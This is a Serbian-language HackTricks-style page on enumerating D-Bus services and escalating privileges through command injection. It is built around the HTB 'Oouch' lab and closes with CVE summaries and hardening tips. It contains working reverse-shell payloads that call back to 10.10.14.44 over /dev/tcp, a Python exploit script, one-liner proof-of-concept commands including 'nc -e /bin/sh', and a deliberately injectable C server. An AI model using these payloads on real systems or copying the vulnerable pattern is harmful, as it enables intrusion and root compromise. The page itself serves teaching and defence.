# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeracija**

D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se primećuje istovremeno delovanje nekoliko autobusnih poruka: sistemski autobus, koji prvenstveno koriste **privilegovane usluge za izlaganje usluga relevantnih za ceo sistem**, i sesijski autobus za svakog prijavljenog korisnika, koji izlaže usluge relevantne samo za tog specifičnog korisnika. Fokus ovde je prvenstveno na sistemskom autobusu zbog njegove povezanosti sa uslugama koje rade sa višim privilegijama (npr. root), jer je naš cilj da povećamo privilegije. Primećeno je da arhitektura D-Bus-a koristi 'usmerivač' po sesijskom autobusu, koji je odgovoran za preusmeravanje poruka klijenata na odgovarajuće usluge na osnovu adrese koju klijenti specificiraju za uslugu sa kojom žele da komuniciraju.

Usluge na D-Bus-u definišu **objekti** i **interfejsi** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana **putanjom objekta**. Ova putanja, slična putanji u datotečnom sistemu, jedinstveno identifikuje svaki objekat koji izlaže usluga. Ključni interfejs za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interfejs, koji sadrži jedinstvenu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih metoda, signala i svojstava objekta, pri čemu se ovde fokusiramo na metode dok se svojstva i signali izostavljaju.

Za komunikaciju sa D-Bus interfejsom, korišćena su dva alata: CLI alat nazvan **gdbus** za jednostavno pozivanje metoda koje izlaže D-Bus u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI alat zasnovan na Python-u, dizajniran za enumeraciju usluga dostupnih na svakom autobusu i za prikaz objekata sadržanih unutar svake usluge.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na prvoj slici prikazane su usluge registrovane sa D-Bus sistemskom magistralom, sa **org.debin.apt** posebno istaknutom nakon odabira dugmeta System Bus. D-Feet upitkuje ovu uslugu za objekte, prikazujući interfejse, metode, svojstva i signale za odabrane objekte, što se vidi na drugoj slici. Takođe su detaljno opisani potpisi svake metode.

Značajna karakteristika je prikaz **ID procesa (pid)** i **komandne linije** usluge, što je korisno za potvrđivanje da li usluga radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet konvertuje u D-Bus tipove pre nego što ih prosledi usluzi.

Međutim, imajte na umu da **neke metode zahtevaju autentifikaciju** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo te metode, pošto je naš cilj da povećamo svoje privilegije bez kredencijala u prvom redu.

Takođe imajte na umu da neke od usluga upitkuju drugu D-Bus uslugu pod imenom org.freedeskto.PolicyKit1 da li korisniku treba dozvoliti da izvrši određene radnje ili ne.

## **Cmd line Enumeration**

### Lista objekata usluga

Moguće je nabrojati otvorene D-Bus interfejse sa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi vezu sa autobusom, autobus dodeljuje toj vezi poseban naziv autobusa koji se zove _jedinstveni naziv veze_. Nazivi autobusa ovog tipa su nepromenljivi—garantovano je da se neće promeniti sve dok veza postoji—i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka autobusa. To znači da nijedna druga veza sa tim autobusom nikada neće imati dodeljen takav jedinstveni naziv veze, čak i ako isti proces zatvori vezu sa autobusom i kreira novu. Jedinstveni nazivi veze su lako prepoznatljivi jer počinju sa—inače zabranjenim—dvotačkom.

### Service Object Info

Zatim, možete dobiti neke informacije o interfejsu sa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

Morate imati dovoljno dozvola.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Napomena kako je u ovom primeru izabran najnoviji interfejs otkriven korišćenjem `tree` parametra (_vidi prethodni odeljak_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Napomena o metodi `.Block` interfejsa `htb.oouch.Block` (onaj koji nas zanima). "s" u drugim kolonama može značiti da očekuje string.

### Monitor/Capture Interface

Sa dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **monitorisati D-Bus komunikaciju**.

Da biste **monitorisali** **komunikaciju** potrebno je da budete **root.** Ako i dalje imate problema kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ako znate kako da konfigurišete D-Bus konfiguracioni fajl da **omogući korisnicima koji nisu root da prisluškuju** komunikaciju, molim vas **kontaktirajte me**!

Različiti načini za monitorisanje:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru, interfejs `htb.oouch.Block` se prati i **poruka "**_**lalalalal**_**" se šalje kroz nesporazum**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u pcap datoteci.

#### Filtriranje svih šumova <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako ima previše informacija na busu, prosledite pravilo za podudaranje ovako:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Više pravila može biti navedeno. Ako poruka odgovara _bilo kojem_ od pravila, poruka će biti odštampana. Kao ovde:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi pravila podudaranja.

### Više

`busctl` ima još više opcija, [**pronađite sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ranjavajući Scenario**

Kao korisnik **qtc unutar hosta "oouch" sa HTB** možete pronaći **neočekivanu D-Bus konfiguracionu datoteku** smeštenu u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Napomena iz prethodne konfiguracije da **ćete morati biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus povezani kod u datoteci _/code/oouch/routes.py._ Ovo je zanimljiv kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete videti, **povezuje se na D-Bus interfejs** i šalje **"Block" funkciji** "client_ip".

Na drugoj strani D-Bus veze se nalazi neki C kompajlirani binarni program. Ovaj kod **sluša** na D-Bus vezi **za IP adresu i poziva iptables putem `system` funkcije** da blokira zadatu IP adresu.\
**Poziv `system` je namerno ranjiv na injekciju komandi**, tako da će payload poput sledećeg stvoriti reverznu ljusku: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Iskoristite to

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. Unutar njega možete pronaći između redova 91-97 **kako su `D-Bus objekat putanja`** **i `ime interfejsa`** **registrovani**. Ove informacije će biti neophodne za slanje informacija na D-Bus vezu:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u liniji 57 možete pronaći da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku biti poslati payload-ovi objektu servisa `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazivu metoda `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći python kod će poslati payload na D-Bus vezu do `Block` metode putem `block_iface.Block(runme)` (_napomena da je izvučen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl i dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` je alat koji se koristi za slanje poruka na “Message Bus”
- Message Bus – Softver koji koriste sistemi za olakšavanje komunikacije između aplikacija. Povezan je sa Message Queue (poruke su poređane u redosledu), ali u Message Bus poruke se šalju u modelu pretplate i takođe veoma brzo.
- “-system” oznaka se koristi da označi da je to sistemska poruka, a ne poruka sesije (po defaultu).
- “–print-reply” oznaka se koristi da ispravno odštampa našu poruku i primi sve odgovore u formatu koji je lako čitljiv.
- “–dest=Dbus-Interface-Block” Adresa Dbus interfejsa.
- “–string:” – Tip poruke koju želimo da pošaljemo interfejsu. Postoji nekoliko formata za slanje poruka kao što su double, bytes, booleans, int, objpath. Od ovoga, “object path” je koristan kada želimo da pošaljemo putanju do datoteke Dbus interfejsu. U ovom slučaju možemo koristiti posebnu datoteku (FIFO) da prosledimo komandu interfejsu u ime datoteke. “string:;” – Ovo je da ponovo pozovemo object path gde stavljamo FIFO reverse shell datoteku/komandu.

_Napomena da u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) se odnosi na objekat usluge, a poslednji deo (`.Block`) se odnosi na naziv metode._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automatizovani alati za enumeraciju (2023-2025)

Ručno enumerisanje velike D-Bus napadačke površine sa `busctl`/`gdbus` brzo postaje bolno. Dva mala FOSS alata objavljena u poslednjih nekoliko godina mogu ubrzati stvari tokom red-team ili CTF angažmana:

### dbusmap ("Nmap za D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Napisan u C; jedinstveni statički binarni fajl (<50 kB) koji prolazi kroz svaki objekat, povlači `Introspect` XML i mapira ga na PID/UID vlasnika.
* Korisne opcije:
```bash
# Prikaz svih servisa na *sistem* busu i ispis svih pozivnih metoda
sudo dbus-map --dump-methods

# Aktivno ispitivanje metoda/atributa koje možete dostići bez Polkit prompata
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Alat označava nezaštićena poznata imena sa `!`, odmah otkrivajući servise koje možete *preuzeti* ili pozive metoda koji su dostupni iz neprivilegovanog shell-a.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Skripta samo u Python-u koja traži *pisive* putanje u systemd jedinicama **i** previše permisivnim D-Bus politikama (npr. `send_destination="*"`).
* Brza upotreba:
```bash
python3 uptux.py -n          # pokreni sve provere ali ne piši log fajl
python3 uptux.py -d          # omogući detaljan debug izlaz
```
* D-Bus modul pretražuje direktorijume ispod i ističe bilo koji servis koji može biti lažiran ili otet od strane običnog korisnika:
* `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor override)

---

## Značajne D-Bus greške u eskalaciji privilegija (2024-2025)

Pratiti nedavno objavljene CVE pomaže u prepoznavanju sličnih nesigurnih obrazaca u prilagođenom kodu. Sledeći problemi sa lokalnom EoP visokog uticaja proizašli su iz nedostatka autentifikacije/ovlašćenja na **sistem busu**:

| Godina | CVE | Komponenta | Osnovni uzrok | Jednolinijski PoC |
|--------|-----|------------|---------------|-------------------|
| 2024   | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID daemon) | `logid` sistemska usluga izlaže neograničen `org.freedesktop.Logiopsd` interfejs koji omogućava *bilo kojem* korisniku da menja profile uređaja i ubacuje proizvoljne shell komande putem makro stringova. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
| 2025   | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Proxy koji se izvršava kao root prosleđuje nasleđene nazive busa backend servisima **bez prosleđivanja UID/Polkit konteksta pozivaoca**, tako da se svaki prosleđeni zahtev tretira kao UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
| 2025   | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Javni `Dispatch` metod nema nikakve ACL-ove → napadač može narediti *package-manager* radniku da instalira proizvoljne RPM-ove. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |

Obrasci koje treba primetiti:
1. Usluga se izvršava **kao root na sistem busu**.
2. Nema PolicyKit provere (ili je zaobiđena putem proxy-a).
3. Metod na kraju vodi do `system()`/instalacije paketa/re-konfiguracije uređaja → izvršavanje koda.

Koristite `dbusmap --enable-probes` ili ručni `busctl call` da potvrdite da li zakrpa vraća ispravnu `polkit_authority_check_authorization()` logiku.

---

## Brze pobede u očvršćavanju i detekciji

* Pretražujte za svetski pisivim ili *send/receive*-otvorenim politikama:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Zahtevajte Polkit za opasne metode – čak i *root* proxy-e bi trebali proslediti *caller* PID `polkit_authority_check_authorization_sync()` umesto svog.
* Smanjite privilegije u dugotrajnim pomoćnicima (koristite `sd_pid_get_owner_uid()` da prebacite imena prostora nakon povezivanja na bus).
* Ako ne možete ukloniti uslugu, barem je *ograničite* na posvećenu Unix grupu i ograničite pristup u njenoj XML politici.
* Plavi tim: omogućite trajno snimanje sistem busa sa `busctl capture --output=/var/log/dbus_$(date +%F).pcap` i uvezite u Wireshark za detekciju anomalija.

---

## Reference

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)


- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
